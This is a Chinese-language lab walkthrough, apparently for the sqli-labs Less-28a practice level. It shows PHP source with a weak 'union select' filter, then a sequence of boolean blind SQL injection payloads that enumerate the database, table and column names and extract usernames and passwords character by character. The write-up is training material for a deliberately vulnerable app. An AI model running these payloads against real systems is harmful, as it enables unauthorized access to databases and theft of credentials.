---
title: less28a
url: https://www.yuque.com/u29002979/ep2zrx/fh0zhkxchbwkx5no
---

```bash
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";

//$id= preg_replace('/[\/*]/',"", $id);			  //strip out /*
//$id= preg_replace('/[--]/',"", $id);				  //Strip out --.
//$id= preg_replace('/[#]/',"", $id);					  //Strip out #.
//$id= preg_replace('/[ +]/',"", $id);	    	  //Strip out spaces.
//$id= preg_replace('/select/m',"", $id);	   	  //Strip out spaces.
//$id= preg_replace('/[ +]/',"", $id);	    	  //Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id); //Strip out spaces.
```

通过源码发现**仅仅匹配了union select组合**，
其余都未匹配，与Less28一样，用盲注的方式 ，**')闭合**

`1'`
`1') and 1=('1`闭合成功 <a name="U8oth"></a>

# 布尔盲注

```bash
判断库长
1')and length(database())=8--+

返回正常,数据库长度为8

逐一字符判断数据库名称
1')and ascii(substr((database()),1,1)=115)--+
返回正常,s
...

判断数据表长度
1')and length((select group_concat(table_name) from  information_schema.tables where table_schema=database() ))=29--+
正常回显数据表串起来长为29
...

逐一字符判断数据表名称
1') and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101--+
正常回显,e
...

判断列长
1')and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))=20--+
正常回显,列长串起来是为20
...

逐一字符判断字段名称
1')and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))=105--+
正常回显,i
...

逐一字符判断字段内容
1')and ascii(substr((select group_concat(username,0x7e,password) from users),1,1))=68--+
显示正常,D
...
```
